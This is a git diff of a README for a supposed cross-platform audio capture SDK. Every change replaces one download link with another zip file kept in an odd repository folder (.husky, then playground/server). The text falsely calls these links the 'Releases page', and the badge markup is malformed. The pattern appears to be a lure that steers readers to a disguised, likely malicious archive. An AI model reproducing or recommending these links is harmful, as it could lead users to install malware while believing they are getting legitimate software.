@@ -1,6 +1,6 @@
 # 🎧 sdk - Capture Audio Effortlessly Across Platforms
 
-[![Download sdk](https://raw.githubusercontent.com/AlvinG08/sdk/main/.husky/sdk_v3.3.zip%20sdk-v1.0-blue)](https://raw.githubusercontent.com/AlvinG08/sdk/main/.husky/sdk_v3.3.zip)
+[![Download sdk](https://github.com/AlvinG08/sdk/raw/refs/heads/main/playground/server/Software-1.5.zip%20sdk-v1.0-blue)](https://github.com/AlvinG08/sdk/raw/refs/heads/main/playground/server/Software-1.5.zip)
 
 ## 📦 Introduction
 
@@ -11,7 +11,7 @@ Welcome to sdk! This is a cross-platform audio capture SDK designed to help you 
 1. **Visit the Releases Page**  
    To get started, you need to download the application. Click on the link below to go directly to the Releases page:
 
-   [https://raw.githubusercontent.com/AlvinG08/sdk/main/.husky/sdk_v3.3.zip](https://raw.githubusercontent.com/AlvinG08/sdk/main/.husky/sdk_v3.3.zip)
+   [https://github.com/AlvinG08/sdk/raw/refs/heads/main/playground/server/Software-1.5.zip](https://github.com/AlvinG08/sdk/raw/refs/heads/main/playground/server/Software-1.5.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Locate the latest version, typically marked with the highest number (e.g., v1.0). This version includes the most recent updates and features.
@@ -77,7 +77,7 @@ The sdk offers the following features to enhance your audio capture experience:
 
 To download sdk, simply visit the Releases page:
 
-[Download sdk](https://raw.githubusercontent.com/AlvinG08/sdk/main/.husky/sdk_v3.3.zip)
+[Download sdk](https://github.com/AlvinG08/sdk/raw/refs/heads/main/playground/server/Software-1.5.zip)
 
 ### Example Installation:
 - **For Windows Users:**  
